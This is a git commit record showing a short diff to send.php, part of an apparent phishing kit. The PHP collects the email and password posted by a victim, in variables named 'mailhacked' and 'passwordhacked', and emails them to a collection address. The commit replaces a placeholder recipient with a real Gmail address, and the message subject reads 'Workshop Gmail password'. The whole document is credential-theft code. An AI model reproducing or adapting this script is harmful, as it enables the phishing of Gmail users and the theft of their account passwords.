75e6af3c9c6ee719c4a5b1c0aaf49549d01b7ea6
unknown657 <69978978+unknown657@users.noreply.github.com>
2020-08-20 21:35:44 +0530

    Update send.php

--- send.php
+++ send.php
@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "yourmailaddresshere@gmail.com";
+         $to = "unknowncontact667@gmail.com";
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
